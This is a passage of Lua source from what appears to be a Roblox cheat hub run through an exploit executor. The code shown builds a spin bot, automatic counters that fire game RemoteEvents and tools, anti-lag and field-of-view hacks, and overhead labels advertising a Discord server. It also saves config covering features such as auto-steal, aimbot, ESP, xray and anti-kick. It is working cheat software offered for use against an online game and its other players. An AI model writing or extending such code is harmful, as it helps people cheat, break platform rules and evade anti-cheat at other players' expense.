        if tool.Parent~=char then local hum=char:FindFirstChildOfClass("Humanoid"); if hum then pcall(function() hum:EquipTool(tool) end); task.wait(.05) end end
        pcall(function() tool:Activate() end); state.lastUsed=tick()
    end
    state.debounce=false
end
setupMedusa = function(char)
    stopMedusaCounter(); char=char or LP.Character; if not char then return end
    local function hook(part)
        if part:IsA("BasePart") then table.insert(_G.PureMedusaState.connections,part:GetPropertyChangedSignal("Anchored"):Connect(function()
            if __HH.medusaCounterEnabled and part.Anchored and part.Transparency==1 then aceUseMedusaCounter() end
        end)) end
    end
    for _,part in ipairs(char:GetDescendants()) do hook(part) end
    table.insert(_G.PureMedusaState.connections,char.DescendantAdded:Connect(hook))
end
stopMedusaCounter = function()
    for _,conn in ipairs(_G.PureMedusaState.connections) do pcall(function() conn:Disconnect() end) end
    _G.PureMedusaState.connections={}; _G.PureMedusaState.debounce=false
end

-- SPIN BOT (ported from FRHUB)
do
    local Spin = _G.PureSpinBot or {}
    _G.PureSpinBot = Spin
    if Spin.stop then pcall(Spin.stop) end
    Spin.enabled = Spin.enabled == true
    Spin.setVisual = nil

    local _spBAV = nil
    local _spMConns = {}

    local function _spStop()
        if _spBAV then pcall(function() _spBAV:Destroy() end); _spBAV = nil end
        for _, connection in ipairs(_spMConns) do
            pcall(function() connection:Disconnect() end)
        end
        _spMConns = {}
    end

    local function _spStart()
        local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        if _spBAV then pcall(function() _spBAV:Destroy() end) end

        _spBAV = Instance.new("BodyAngularVelocity")
        _spBAV.Name = "SpinForce"
        _spBAV.MaxTorque = Vector3.new(0, math.huge, 0)
        _spBAV.AngularVelocity = Vector3.new(0, 25, 0)
        _spBAV.P = 1e5
        _spBAV.Parent = root

        for _, connection in ipairs(_spMConns) do
            pcall(function() connection:Disconnect() end)
        end
        _spMConns = {}

        local character = root.Parent
        if character then
            local function _spOnMedusa(part)
                if part.Anchored and part.Transparency == 1 then
                    pcall(function() aceUseMedusaCounter(true) end)
                    local unanchorConnection
                    unanchorConnection = part:GetPropertyChangedSignal("Anchored"):Connect(function()
                        if not part.Anchored then
                            pcall(function() unanchorConnection:Disconnect() end)
                            if _spBAV then task.defer(_spStart) end
                        end
                    end)
                    table.insert(_spMConns, unanchorConnection)
                end
            end

            for _, part in ipairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    table.insert(_spMConns, part:GetPropertyChangedSignal("Anchored"):Connect(function()
                        _spOnMedusa(part)
                    end))
                end
            end
            table.insert(_spMConns, character.DescendantAdded:Connect(function(part)
                if part:IsA("BasePart") then
                    table.insert(_spMConns, part:GetPropertyChangedSignal("Anchored"):Connect(function()
                        _spOnMedusa(part)
                    end))
                end
            end))
        end
    end

    Spin.restart = function()
        if not Spin.enabled then return end
        if _spBAV then _spBAV = nil end
        for _, connection in ipairs(_spMConns) do
            pcall(function() connection:Disconnect() end)
        end
        _spMConns = {}
        task.defer(_spStart)
    end

    Spin.start = _spStart
    Spin.stop = _spStop
    Spin.setEnabled = function(on)
        on = on == true
        Spin.enabled = on
        if Spin.setVisual then Spin.setVisual(on) end
        if on then _spStart() else _spStop() end
    end
end

batCounterDebounce = false
BAT_COUNTER_SLAP_LIST = {"Bat", "Slap", "Iron Slap", "Gold Slap", "Diamond Slap", "Emerald Slap", "ZeyHubb Slap", "Dark Matter Slap", "Flame Slap", "Nuclear Slap", "Galaxy Slap", "Glitched Slap"}
function findBatForCounter()
    local c = LP.Character
    if not c then return nil end
    local bp = LP:FindFirstChildOfClass("Backpack")
    for _, name in ipairs(BAT_COUNTER_SLAP_LIST) do
        local t = c:FindFirstChild(name) or (bp and bp:FindFirstChild(name))
        if t then return t end
    end
    for _, ch in ipairs(c:GetChildren()) do
        if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end
    end
    if bp then
        for _, ch in ipairs(bp:GetChildren()) do
            if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end
        end
    end
    return nil
end
local function swingBatForCounter(bat, char)
    local hum2 = char:FindFirstChildOfClass("Humanoid")
    if bat.Parent ~= char then
        if hum2 then pcall(function() hum2:EquipTool(bat) end) end; task.wait(0.05)
    end
    local remote = bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
    if remote and remote:IsA("RemoteEvent") then
        pcall(function() remote:FireServer() end); task.wait(0.8); pcall(function() remote:FireServer() end)
    else
        pcall(function() bat:Activate() end); task.wait(0.8); pcall(function() bat:Activate() end)
    end
end
startBatCounter = function()
    if Conns.batCounter then return end
    Conns.batCounter = RunService.Heartbeat:Connect(function()
        if not __HH.batCounterEnabled then return end
        if batCounterDebounce then return end
        local char = LP.Character; if not char then return end
        local hum2 = char:FindFirstChildOfClass("Humanoid"); if not hum2 then return end
        local st = hum2:GetState()
        if st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown then
            batCounterDebounce = true
            task.spawn(function()
                local bat = findBatForCounter()
                if bat then swingBatForCounter(bat, char) end
                task.wait(0.5); batCounterDebounce = false
            end)
        end
    end)
end
stopBatCounter = function()
    if Conns.batCounter then Conns.batCounter:Disconnect(); Conns.batCounter = nil end
    batCounterDebounce = false
end

end
do
local SKY_TAG = "VynxSkyTheme"
__HH.currentSkyTheme = "Off"
SKY_PRESETS = {
    ["Off"]           = {kind="off"},
    ["Night"]         = {clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140},sky={stars=4000,moon=18,sun=0,moonTex=true},atm={dens=0.45,color={120,60,180},decay={60,20,100},glare=0.5,haze=1.2}},
    ["Aurora"]        = {clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150},atm={dens=0.55,color={255,80,200},decay={255,20,150},glare=2.5,haze=3},clouds={cover=0.7,dens=0.7,color={255,240,250}}},
    ["Sunset"]        = {clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110},sky={stars=0,sun=25,moon=0},atm={dens=0.5,color={255,130,60},decay={255,80,30},glare=2,haze=2.5},clouds={cover=0.55,dens=0.55,color={255,200,140}}},
    ["Galaxy"]        = {clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110},sky={stars=10000,moon=30,sun=0},atm={dens=0.15,color={40,20,80},decay={20,10,50},glare=0.3,haze=0.5}},
    ["Cyber"]         = {clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180},sky={stars=2000,moon=12},atm={dens=0.4,color={0,200,255},decay={150,0,255},glare=2,haze=2},clouds={cover=0.4,dens=0.6,color={100,200,255}}},
    ["Sakura"]        = {clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170},sky={sun=8},atm={dens=0.3,color={255,200,220},decay={255,170,200},glare=1,haze=1.5},clouds={cover=0.6,dens=0.4,color={255,250,252}}},
    ["Pink Night"]    = {clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120},sky={stars=5000,moon=22,sun=0,moonTex=true},atm={dens=0.5,color={255,80,180},decay={140,30,100},glare=0.7,haze=1.4},clouds={cover=0.3,dens=0.5,color={180,90,150}}},
    ["Blood Moon"]    = {clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50},sky={stars=1500,moon=28,sun=0,moonTex=true},atm={dens=0.6,color={220,30,30},decay={120,10,10},glare=1.4,haze=2},clouds={cover=0.5,dens=0.7,color={120,30,30}}},
    ["Emerald Dawn"]  = {clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150},sky={sun=18,moon=0,stars=0},atm={dens=0.4,color={80,200,140},decay={40,150,90},glare=1.8,haze=2.2},clouds={cover=0.5,dens=0.5,color={200,255,220}}},
    ["Volcanic"]      = {clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50},sky={stars=200,sun=12,moon=0},atm={dens=0.75,color={255,60,0},decay={180,20,0},glare=3,haze=3.5},clouds={cover=0.8,dens=0.9,color={120,40,20}}},
    ["Arctic"]        = {clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245},sky={sun=10,stars=0,moon=0},atm={dens=0.3,color={180,220,255},decay={140,200,240},glare=1.5,haze=1.8},clouds={cover=0.7,dens=0.6,color={250,253,255}}},
    ["Midnight Ocean"]= {clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140},sky={stars=6000,moon=24,sun=0,moonTex=true},atm={dens=0.5,color={20,60,140},decay={10,30,90},glare=0.6,haze=1.5}},
    ["Vaporwave"]     = {clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210},sky={stars=1000,moon=14},atm={dens=0.45,color={255,100,220},decay={120,60,255},glare=2.2,haze=2.4},clouds={cover=0.5,dens=0.55,color={200,150,255}}},
    ["Toxic"]         = {clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90},atm={dens=0.55,color={100,220,40},decay={60,150,20},glare=1.8,haze=2.6},clouds={cover=0.65,dens=0.7,color={180,255,120}}},
    ["Solar Eclipse"] = {clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70},sky={stars=3500,sun=22,moon=0},atm={dens=0.5,color={255,140,40},decay={30,20,40},glare=2.8,haze=1.8}},
    ["Hellscape"]     = {clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40},sky={stars=100,sun=30,moon=0},atm={dens=0.85,color={255,30,0},decay={120,0,0},glare=3.5,haze=4},clouds={cover=0.95,dens=0.95,color={80,20,10}}},
    ["Heaven"]        = {clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220},sky={sun=16,moon=0,stars=0},atm={dens=0.25,color={255,250,220},decay={255,240,200},glare=3,haze=1.5},clouds={cover=0.85,dens=0.5,color={255,255,255}}},
    ["Storm"]         = {clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120},sky={stars=0,sun=6,moon=0},atm={dens=0.65,color={80,90,120},decay={40,50,80},glare=0.5,haze=3},clouds={cover=0.95,dens=0.95,color={60,65,80}}},
    ["Sunrise"]       = {clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140},sky={sun=22,stars=0,moon=0},atm={dens=0.45,color={255,180,100},decay={255,140,80},glare=2.4,haze=2.2},clouds={cover=0.4,dens=0.4,color={255,220,180}}},
    ["Deep Space"]    = {clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60},sky={stars=15000,moon=0,sun=0},atm={dens=0.08,color={15,5,40},decay={5,0,20},glare=0.2,haze=0.3}},
    ["Lavender Dream"]= {clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230},sky={stars=800,moon=16,sun=0},atm={dens=0.4,color={200,160,255},decay={160,120,220},glare=1.4,haze=1.8},clouds={cover=0.55,dens=0.5,color={220,200,255}}},
    ["Inferno"]       = {clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50},sky={sun=26,moon=0,stars=0},atm={dens=0.6,color={255,90,20},decay={200,40,0},glare=3,haze=3.2},clouds={cover=0.7,dens=0.7,color={200,80,40}}},
    ["Mint Sky"]      = {clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220},sky={sun=10},atm={dens=0.32,color={150,255,210},decay={100,220,180},glare=1.6,haze=1.6},clouds={cover=0.55,dens=0.45,color={240,255,250}}},
}
local SKY_ORDER = {"Off","Night","Aurora","Sunset","Galaxy","Cyber","Sakura","Pink Night","Blood Moon","Emerald Dawn","Volcanic","Arctic","Midnight Ocean","Vaporwave","Toxic","Solar Eclipse","Hellscape","Heaven","Storm","Sunrise","Deep Space","Lavender Dream","Inferno","Mint Sky"}

local function _color3(rgb) return Color3.fromRGB(rgb[1], rgb[2], rgb[3]) end

local function applySkyTheme(mode)
    for _, child in ipairs(Lighting:GetChildren()) do
        if child:GetAttribute(SKY_TAG) then pcall(function() child:Destroy() end) end
    end
    local terrain = workspace:FindFirstChildOfClass("Terrain")
    if terrain then
        for _, child in ipairs(terrain:GetChildren()) do
            if child:GetAttribute(SKY_TAG) then pcall(function() child:Destroy() end) end
        end
    end
    local preset = SKY_PRESETS[mode]
    if not preset or preset.kind == "off" then
        Lighting.ClockTime = 14; Lighting.Brightness = 2
        Lighting.OutdoorAmbient = Color3.fromRGB(127,127,127)
        Lighting.Ambient = Color3.fromRGB(127,127,127)
        Lighting.FogEnd = 100000; Lighting.GlobalShadows = true
        __HH.currentSkyTheme = "Off"; return
    end
    Lighting.FogStart = 0; Lighting.FogEnd = 100000; Lighting.FogColor = Color3.fromRGB(200,200,200)
    Lighting.ColorShift_Top = Color3.fromRGB(0,0,0); Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
    Lighting.GlobalShadows = true; Lighting.ClockTime = preset.clock or 14; Lighting.Brightness = preset.brightness or 2
    if preset.outAmb then Lighting.OutdoorAmbient = _color3(preset.outAmb) end
    if preset.ambient then Lighting.Ambient = _color3(preset.ambient) end
    if preset.sky then
        local sky = Instance.new("Sky"); sky:SetAttribute(SKY_TAG, true)
        if preset.sky.stars then sky.StarCount = preset.sky.stars end
        if preset.sky.moon then sky.MoonAngularSize = preset.sky.moon end
        if preset.sky.sun then sky.SunAngularSize = preset.sky.sun end
        if preset.sky.moonTex then sky.MoonTextureId = "rbxasset://sky/moon.jpg" end
        sky.Parent = Lighting
    end
    if preset.atm then
        local atm = Instance.new("Atmosphere"); atm:SetAttribute(SKY_TAG, true)
        atm.Density = preset.atm.dens or 0.3; atm.Color = _color3(preset.atm.color)
        atm.Decay = _color3(preset.atm.decay); atm.Glare = preset.atm.glare or 1; atm.Haze = preset.atm.haze or 1
        atm.Parent = Lighting
    end
    if preset.clouds and terrain then
        local clouds = Instance.new("Clouds"); clouds:SetAttribute(SKY_TAG, true)
        clouds.Cover = preset.clouds.cover or 0.5; clouds.Density = preset.clouds.dens or 0.5
        clouds.Color = _color3(preset.clouds.color); clouds.Parent = terrain
    end
    __HH.currentSkyTheme = mode
end

local defLightBrightness, defLightClock, defLightAmbient

local function applyAntiLagDerender(obj)
    pcall(function()
        if obj:IsA("Accessory") or obj:IsA("Hat") then obj:Destroy()
        elseif obj:IsA("BasePart") then obj.Material = Enum.Material.Plastic; obj.Reflectance = 0; obj.CastShadow = false
        elseif obj:IsA("Decal") or obj:IsA("Texture") then obj.Transparency = 1
        elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then obj.Enabled = false
        elseif obj:IsA("AnimationController") or obj:IsA("Animator") then
            for _,t in ipairs(obj:GetPlayingAnimationTracks()) do pcall(function() t:Stop(0) end) end
        end
    end)
end

local function enableAntiLag()
    __HH.removeAccessoriesEnabled = true; __HH.antiLagEnabled = true
    defLightBrightness = defLightBrightness or Lighting.Brightness
    defLightClock = defLightClock or Lighting.ClockTime
    defLightAmbient = defLightAmbient or Lighting.OutdoorAmbient
    Lighting.GlobalShadows = false; Lighting.FogEnd = 1e10; Lighting.Brightness = 1
    Lighting.EnvironmentDiffuseScale = 0; Lighting.EnvironmentSpecularScale = 0
    for _, e in pairs(Lighting:GetChildren()) do
        pcall(function()
            if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then e.Enabled = false end
        end)
    end
    for _, obj in ipairs(workspace:GetDescendants()) do applyAntiLagDerender(obj) end
    if __HH.antiLagDescConn then __HH.antiLagDescConn:Disconnect() end
    __HH.antiLagDescConn = workspace.DescendantAdded:Connect(function(obj)
        if __HH.removeAccessoriesEnabled then applyAntiLagDerender(obj) end
    end)
end

local function disableAntiLag()
    __HH.removeAccessoriesEnabled = false; __HH.antiLagEnabled = false
    if __HH.antiLagDescConn then __HH.antiLagDescConn:Disconnect(); __HH.antiLagDescConn = nil end
    pcall(function()
        if defLightBrightness then Lighting.Brightness = defLightBrightness end
        if defLightClock then Lighting.ClockTime = defLightClock end
        if defLightAmbient then Lighting.OutdoorAmbient = defLightAmbient end
        Lighting.ExposureCompensation = 0
    end)
end

local function enableStretchRez()
    __HH.stretchRezEnabled = true; workspace.CurrentCamera.FieldOfView = 107
    if __HH.stretchRezConn then __HH.stretchRezConn:Disconnect() end
    __HH.stretchRezConn = RunService.RenderStepped:Connect(function()
        if not __HH.stretchRezEnabled then __HH.stretchRezConn:Disconnect(); __HH.stretchRezConn = nil; return end
        workspace.CurrentCamera.FieldOfView = 107
    end)
end

local function disableStretchRez()
    __HH.stretchRezEnabled = false
    if __HH.stretchRezConn then __HH.stretchRezConn:Disconnect(); __HH.stretchRezConn = nil end
    workspace.CurrentCamera.FieldOfView = 70
end

function saveConfig()
    local function ks(e) return {kb = e.kb and e.kb.Name or nil, gp = e.gp and e.gp.Name or nil} end
    local cfg = {
        normalSpeed = NS, carrySpeed = CS,
        r3Enabled = (_G.Round3SpeedBooster and _G.Round3SpeedBooster.Enabled) == true,
        r3NormalSpeed = (_G.Round3SpeedBooster and _G.Round3SpeedBooster.NormalSpeed) or NS,
        r3CarrySpeed = (_G.Round3SpeedBooster and _G.Round3SpeedBooster.CarrySpeed) or CS,
        r3ForceCarry = (_G.Round3SpeedBooster and _G.Round3SpeedBooster.ForceCarry) == true,
        dropBrainrotKey = ks(__HH.KB.DropBrainrot), 
        tpLockKey = ks(__HH.KB.TPLock), laggerToggleKey = ks(__HH.KB.LaggerToggle),
        frameResetKey = ks(__HH.KB.InstaReset), frameResetKeyVersion = 1,
        autoLeftKey = ks(__HH.KB.AutoLeft), autoRightKey = ks(__HH.KB.AutoRight), tpFloorKey = ks(__HH.KB.TPFloor), guiHideKey = ks(__HH.KB.GuiHide),
        speedToggleKey = ks(__HH.KB.SpeedToggle), batV2Key = ks(__HH.KB.BatV2Toggle),
        antiRagdoll = __HH.antiRagdollEnabled,
        infiniteJump = __HH.infJumpEnabled, medusaCounter = __HH.medusaCounterEnabled,
        medusaReset = __HH.medusaResetEnabled, batCounter = __HH.batCounterEnabled,
        carryMode = carrySpeedActive, laggerMode = laggerModeEnabled, laggerCarryMode = (laggerModeEnabled and carrySpeedActive),
        laggerSpeed = LAGGER_SPEED, laggerCarrySpeed = LAGGER_CARRY_SPEED,
        aimbotV1Speed = aimbotV1Speed,
        autoCarrySpeedEnabled = autoCarrySpeedEnabled,
        tpLockEnabled = __HH.tpLockEnabled, autoSwing = autoSwingEnabled,
        mirrorTPDownEnabled = (_G.PureMirrorTPDown and _G.PureMirrorTPDown.enabled
            and _G.PureMirrorTPDown.enabled()) == true,
        batSpamEnabled = (_G.PureBatSpam and _G.PureBatSpam.enabled
            and _G.PureBatSpam.enabled()) == true,
        spinBotEnabled = (_G.PureSpinBot and _G.PureSpinBot.enabled) == true,
        unwalkEnabled = __HH.unwalkEnabled, antiLag = __HH.antiLagEnabled, stretchRez = __HH.stretchRezEnabled,
        autoTPEnabled = __HH.autoTPEnabled, autoTPHeight = __HH.autoTPHeight,
        autoJumpBrainrot = __HH.autoJumpBrainrot,
        floatEnabled = __HH.floatEnabled, floatHeight = __HH.floatHeight,
        guiTransparencyEnabled = __HH.guiTransparencyEnabled,
        mobileButtonsEnabled = __HH.mobileButtonsEnabled, mobileButtonsSize = __HH.mobileButtonsSize,
        circleButtonsEnabled = __HH.circleButtonsEnabled, shapeButtonsEnabled = __HH.shapeButtonsEnabled,
        rectangularButtonsEnabled = __HH.rectangularButtonsEnabled,
        infJumpMode = __HH.infJumpMode,
        antiDie = __HH.antiDieEnabled, autoResetOnDeath = __HH.autoResetOnDeath,
        uiLocked = __HH.uiLocked, perButtonDragEnabled = __HH.perButtonDragEnabled,
        batV2Enabled = __HH.batV2Enabled,
        batAimMode = batAimMode,
        skyTheme = __HH.currentSkyTheme, uiScale = uiScaleValue,
        buttonVisibility = __HH.buttonVisibility,
        espEnabled = __HH.espEnabled,
        headlessEnabled = __HH.headlessEnabled,
        korbloxEnabled = __HH.korbloxEnabled,
        accessoryPack = currentAccessoryPack,
        autoLeftEnabled = autoLeftEnabled,
        autoRightEnabled = autoRightEnabled,
        antiKick = antiKickEnabled,
        safeMode = antiKickEnabled,
        aceAnimationPack = __HH.aceSelectedAnimationPack,
        -- v17 integrated feature state
        autoStealEnabled = (_G.HorizonStealModes and _G.HorizonStealModes.GetEnabled and _G.HorizonStealModes.GetEnabled()) == true,
        autoStealMode = (_G.HorizonStealModes and _G.HorizonStealModes.GetMode and _G.HorizonStealModes.GetMode()) or "V1",
        autoStealRadius = (_G.HorizonStealModes and _G.HorizonStealModes.GetRadius and _G.HorizonStealModes.GetRadius()) or 60,
        bodyLockEnabled = __HH.bodyLockEnabled == true,
        bodyLockRange = __HH.bodyLockRange or 20,
        antiFlingEnabled = __HH.antiFlingEnabled == true,
        selectedDevice = __HH.selectedDevice,
        -- ===== Ambitious ports =====
        xrayEnabled            = _G.PureXRayEnabled == true,
        brainrotXRayEnabled    = _G.AmbitiousBrainrotXRayEnabled == true,
        customToolsEnabled     = _G.AmbitiousCustomToolsEnabled == true,
        rainbowToolsEnabled    = _G.AmbitiousRainbowToolsEnabled == true,
        transparentToolsEnabled= _G.AmbitiousTransparentToolsEnabled == true,
        customSoundsEnabled    = _G.AmbitiousCustomSoundsEnabled == true,
        customToolSkins        = _G.AmbitiousCustomToolSkins,
        rainbowJoystickEnabled = _G.AmbitiousRainbowJoystickEnabled == true,
        radiusCircleEnabled    = _G.PureRadiusCircleEnabled == true,
        radiusCircleRadius     = _G.PureRadiusCircleRadius or 8,
        radiusCircleColor      = (function()
            local c = _G.PureRadiusCircleColor or Color3.fromRGB(201, 238, 255)
            return { math.floor(c.R*255+0.5), math.floor(c.G*255+0.5), math.floor(c.B*255+0.5) }
        end)(),
        avatarChanger = (function()
            local ac = _G._AmbitiousAvatarChanger
            if type(ac) ~= "table" then return nil end
            local out = {}
            for k, v in pairs(ac) do
                out[k] = { enabled = v.enabled == true, savedId = v.savedId, savedName = v.savedName or "" }
            end
            return out
        end)(),
    }
    pcall(function() writefile("VynxPC.json", __HH.HS:JSONEncode(cfg)) end)
    return cfg
end

-- Build the exact same settings table saveConfig() writes to disk, without
-- touching the file. Used by "Copy Config" so the exported code always
-- matches what would be auto-saved.
function __HH.buildConfigTable()
    return saveConfig()
end

-- Copy Config / Load Config: turns the full settings table into a single
-- portable text code (JSON + Base64) and back. Base64 keeps it safe to
-- paste anywhere; JSON round-trips every field exactly so Load Config
-- restores settings identically ("نفسها بالظبط").
-- Implemented as plain Lua (no HttpService:Base64Encode/Decode, which does
-- not exist on Roblox's HttpService and was silently failing before).
local B64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function base64Encode(data)
    local out = {}
    local len = #data
    local i = 1
    while i <= len do
        local b1, b2, b3 = data:byte(i, i + 2)
        b2 = b2 or 0
        b3 = b3 or 0
        local n = b1 * 65536 + b2 * 256 + b3
        local c1 = math.floor(n / 262144) % 64
        local c2 = math.floor(n / 4096) % 64
        local c3 = math.floor(n / 64) % 64
        local c4 = n % 64
        local rem = len - i + 1
        out[#out + 1] = B64_CHARS:sub(c1 + 1, c1 + 1)
        out[#out + 1] = B64_CHARS:sub(c2 + 1, c2 + 1)
        out[#out + 1] = (rem >= 2) and B64_CHARS:sub(c3 + 1, c3 + 1) or "="
        out[#out + 1] = (rem >= 3) and B64_CHARS:sub(c4 + 1, c4 + 1) or "="
        i = i + 3
    end
    return table.concat(out)
end

local B64_LOOKUP = {}
for idx = 1, #B64_CHARS do
    B64_LOOKUP[B64_CHARS:sub(idx, idx)] = idx - 1
end

local function base64Decode(data)
    data = data:gsub("[^" .. B64_CHARS .. "=]", "")
    local out = {}
    local i = 1
    local len = #data
    while i <= len do
        local c1 = data:sub(i, i)
        local c2 = data:sub(i + 1, i + 1)
        local c3 = data:sub(i + 2, i + 2)
        local c4 = data:sub(i + 3, i + 3)
        local n1 = B64_LOOKUP[c1]
        local n2 = B64_LOOKUP[c2]
        if not n1 or not n2 then break end
        local n3 = (c3 ~= "=" and c3 ~= "") and B64_LOOKUP[c3] or nil
        local n4 = (c4 ~= "=" and c4 ~= "") and B64_LOOKUP[c4] or nil
        local n = n1 * 262144 + n2 * 4096 + (n3 or 0) * 64 + (n4 or 0)
        local byte1 = math.floor(n / 65536) % 256
        local byte2 = math.floor(n / 256) % 256
        local byte3 = n % 256
        out[#out + 1] = string.char(byte1)
        if n3 then out[#out + 1] = string.char(byte2) end
        if n4 then out[#out + 1] = string.char(byte3) end
        i = i + 4
    end
    return table.concat(out)
end

local CONFIG_CODE_PREFIX = "HZNV2-"
function __HH.encodeConfigCode(cfg)
    local json = __HH.HS:JSONEncode(cfg)
    local b64 = base64Encode(json)
    return CONFIG_CODE_PREFIX .. b64
end

function __HH.decodeConfigCode(code)
    if type(code) ~= "string" then return nil end
    code = code:gsub("^%s+", ""):gsub("%s+$", "")
    if code == "" then return nil end
    local body = code
    if code:sub(1, #CONFIG_CODE_PREFIX) == CONFIG_CODE_PREFIX then
        body = code:sub(#CONFIG_CODE_PREFIX + 1)
    end
    local okB64, json = pcall(base64Decode, body)
    if not okB64 or type(json) ~= "string" or json == "" then return nil end
    local okJson, cfg = pcall(function() return __HH.HS:JSONDecode(json) end)
    if not okJson or type(cfg) ~= "table" then return nil end
    return cfg
end

task.spawn(function() while task.wait(5) do saveConfig() end end)


local overheadGui = nil
local overheadSpeedLabel = nil

local function createHeadLabels(char)
    if overheadGui then
        pcall(function() overheadGui:Destroy() end)
        overheadGui = nil
        overheadSpeedLabel = nil
    end
    if not char then return end
    local head = char:FindFirstChild("Head") or char:WaitForChild("Head", 5)
    if not head then return end
    
    overheadGui = Instance.new("BillboardGui")
    overheadGui.Name = "yousef_duels_OverheadInfo"
    overheadGui.Size = UDim2.new(0, 250, 0, 100)
    overheadGui.StudsOffset = Vector3.new(0, 3, 0)
    overheadGui.AlwaysOnTop = true
    overheadGui.LightInfluence = 0
    overheadGui.Parent = head
    

    
    -- Discord Link (Middle)
    local discordLbl = Instance.new("TextLabel")
    discordLbl.Name = "Discord"
    discordLbl.Size = UDim2.new(1, 0, 0, 26)
    discordLbl.Position = UDim2.new(0, 0, 0, 26)
    discordLbl.BackgroundTransparency = 1
    discordLbl.Text = "discord.gg/VMB5ywPY7"
    discordLbl.TextColor3 = Color3.fromRGB(201, 238, 255)
    discordLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    discordLbl.TextStrokeTransparency = 0
    discordLbl.Font = Enum.Font.GothamBold
    discordLbl.TextSize = 14
    discordLbl.TextXAlignment = Enum.TextXAlignment.Center
    discordLbl.ZIndex = 10
    discordLbl.Parent = overheadGui
    
    -- Speed (Bottom)
    overheadSpeedLabel = Instance.new("TextLabel")
    overheadSpeedLabel.Name = "Speed"
    overheadSpeedLabel.Size = UDim2.new(1, 0, 0, 26)
    overheadSpeedLabel.Position = UDim2.new(0, 0, 0, 52)
    overheadSpeedLabel.BackgroundTransparency = 1
    overheadSpeedLabel.Text = "Speed: 0"
    overheadSpeedLabel.TextColor3 = Color3.fromRGB(201, 238, 255)
    overheadSpeedLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    overheadSpeedLabel.TextStrokeTransparency = 0
    overheadSpeedLabel.Font = Enum.Font.GothamBold
    overheadSpeedLabel.TextSize = 16
    overheadSpeedLabel.TextXAlignment = Enum.TextXAlignment.Center
    overheadSpeedLabel.ZIndex = 10
    overheadSpeedLabel.Parent = overheadGui
    
    local conn
    conn = RunService.RenderStepped:Connect(function()
        if not char or not char.Parent or not overheadSpeedLabel then conn:Disconnect(); return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum and hrp then
            local md = hum.MoveDirection
            if md.Magnitude > 0.1 then
                -- player is moving: show the configured speed (stable)
                overheadSpeedLabel.Text = "Speed: " .. tostring(getActiveMoveSpeed())
            else
                overheadSpeedLabel.Text = "Speed: 0"
            end
        end

    end)
end

LP.CharacterAdded:Connect(function(char)
    task.wait(0.5)
    createHeadLabels(char)
end)

if LP.Character then
    task.spawn(function()
        task.wait(0.5)
        createHeadLabels(LP.Character)
    end)
end

-- Clean Hub ragdoll countdown (billboard over head), recolored blue.
do
    local _ragCountdownRunning = false
    local function _getRagBillboard()
        local char = LP.Character
        if not char then return nil, nil end
        local head = char:FindFirstChild("Head")
        if not head then return nil, nil end
        local cGui = game:GetService("CoreGui")
        local pGui = LP:WaitForChild("PlayerGui")
        local existing = cGui:FindFirstChild("RagCountdownBillboard")
        if existing then existing:Destroy() end
        local existing2 = pGui:FindFirstChild("RagCountdownBillboard")
        if existing2 then existing2:Destroy() end
        local bb = Instance.new("BillboardGui")
        bb.Name = "RagCountdownBillboard"
        bb.Size = UDim2.new(0, 84, 0, 42)
        bb.StudsOffset = Vector3.new(0, 4.5, 0)
        bb.AlwaysOnTop = true
        bb.Adornee = head
        if not pcall(function() bb.Parent = cGui end) then
            bb.Parent = pGui
        end
        local lbl = Instance.new("TextLabel")
        lbl.Size = UDim2.new(1, 0, 1, 0)
        lbl.AnchorPoint = Vector2.new(0.5, 0.5)
        lbl.Position = UDim2.new(0.5, 0, 0.5, 0)
        lbl.BackgroundTransparency = 1
        lbl.Font = Enum.Font.GothamBlack
        lbl.TextScaled = true
        lbl.TextColor3 = Color3.fromRGB(171, 225, 255)
        lbl.TextStrokeColor3 = Color3.fromRGB(9, 30, 48)
        lbl.TextStrokeTransparency = 0
        lbl.Text = ""
        lbl.Parent = bb
        return bb, lbl
    end
    local function _ragPunch(lbl, text)
        if not (lbl and lbl.Parent) then return end
        lbl.Text = text
    end
    local function _startRagCountdown()
        if _ragCountdownRunning then return end
        _ragCountdownRunning = true
        task.spawn(function()
            local bb, lbl = _getRagBillboard()
